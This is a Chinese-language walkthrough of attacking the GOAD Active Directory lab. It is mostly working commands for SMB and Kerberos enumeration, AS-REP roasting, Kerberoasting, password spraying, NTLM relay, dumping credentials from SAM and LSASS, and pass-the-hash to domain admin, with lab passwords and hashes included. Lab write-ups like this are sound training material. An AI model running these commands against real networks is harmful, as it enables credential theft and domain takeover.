使用netexec通过smb枚举存活主机

域控

192.168.56.10    sevenkingdoms.local
192.168.56.11    north.sevenkingdoms.local
192.168.56.11    essos.local

端口扫描

先用telnet协议扫描判断端口存活

匿名枚举

netexec smb匿名枚举查看共享目录

nxc -t 10 smb 192.168.56.10 192.168.56.11 192.168.56.12 192.168.56.22 192.168.56.23 -u 'asd' -p 'asd' --shares

netexec smb匿名枚举域用户

nxc -t 10 smb 192.168.56.10 192.168.56.11 192.168.56.12 192.168.56.22 192.168.56.23 --users

kerberos用户名枚举

通过暴力枚举域内用户名，可以避免错误登录次数记录。使用的工具是kerbrute，但是有个坑，直接用proxychains会代理失败

在论坛里问了下，得到了答案，因为proxychains的代理原理问题，代理不了某些go工具的流量

所以这里用tun2socks进行代理，首先新建一个隧道tun-goad，将代理流量全部转发到本地1081端口

./tun2socks-linux-amd64 -device tun://tun-goad -proxy socks5://127.0.0.1:1081

开启隧道网卡

ip link set tun-goad up

将192.168.56.0/24的流量全部通过隧道转发

ip route add 192.168.56.0/24 dev tun-goad

再次枚举即可，为了方便工具使用，后续也采用这种隧道代理方式

ASREP - roasting 非预身份认证攻击

需要域账户设置为不需要Kerberos预身份验证，但是该选项默认不开启。预身份验证是为了防止密码爆破，当关闭后，攻击者可以使用指定域用户去请求票据，此时域控不会作任何验证就将TGT票据和该用户Hash加密的Session Key返回，此时再在本地离线破解，爆破是否成功取决于字典强度。

使用impacket工具包的GetNPUsers脚本进行攻击

impacket-GetNPUsers north.sevenkingdoms.local/ -dc-ip 192.168.56.11 -no-pass -usersfile user_nopass.txt

hashcat爆破

hashcat -m 18200 hashfile /usr/share/wordlists/rockyou.txt --force

密码喷洒

域环境中一般都配置了密码策略，当用户多次密码错误登录失败后就会锁定用户，所以在登录爆破时，可以采取用密码去撞多个账号。比较经典的是将用户名作为密码进行登录尝试

nxc smb 192.168.56.11 -u user.txt -p user.txt --no-bruteforce

查看登录错误次数记录

nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users

枚举域用户

可以向前面一样使用nxc

nxc smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users

也可以使用impacket的GetADUsers脚本

impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople -dc-ip 192.168.56.11

当然，如果已经有一台域内主机的权限的话，也可以尝试net user /domain

利用域信任通过ldap获取其他用户

ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=pe
rson)(objectClass=user))" |grep 'distinguishedName:'

SPN用户Kerberoasting

SPN即服务主体名称，是服务实例在使用 Kerberos 身份验证的网络上的唯一标识符，其由服务类、主机名和端口组成。通过指定SPN用户从KDC获取对应的ST，然后将ST保存到本地离线破解。

impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes

hashcat破解

hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force

枚举共享目录

用新的用户凭据枚举共享目录

nxc smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares

导出域中的DNS 记录，这里攻击环境没有配置dns解析，所以hostname直接指定为域控ip地址

adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 192.168.56.10

ntlm relay中继

利用Responder获取ntlm hash，然后离线破解或者中继重放到其他机器

离线破解

抓取hash

python3 Responder.py -I vboxnet0

hashcat破解

hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt

中继攻击

结合Responder和impacket工具包中的ntlmrelayx进行中继重放（如果smb签名为False的话），攻击成功后会在本地建立一个socks代理。
首先修改Responder.conf禁用smb 和 http 服务，将其设置为off

启动ntlmrelayx准备进行中继，smb_targets.txt中是被中继目标机器

ntlmrelayx.py -tf smb_targets.txt -of netntlm -smb2support -socks -socks-address 0.0.0.0

可以在终端界面输入socks命令查看成功的目标

设置代理，使用impacket工具包的secretsdump脚本导出sam文件数据库

proxychains -q impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'

使用lsassy导出lsass进程中存储的凭据

proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22

使用DonAPI收集凭据

proxychains -q poetry run DonPAPI collect --no-pass -d NORTH -u EDDARD.STARK -t 192.168.56.22

使用impacket的smbclient.py连接

proxychains -q smbclient.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug

使用impacket的smbexec.py进行命令执行

proxychains smbexec.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug

PTH 攻击

通过pth以本地登录的方式攻击其他服务器

nxc smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth

当计算机升级为域控制器时，本地管理员密码将用作域管理员密码，所以直接hash传递，获取到了north域的域管理员权限

nxc smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'

另一种形如NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a的hash不能传递，只能本地破解，除非密码很弱，不然很难破解
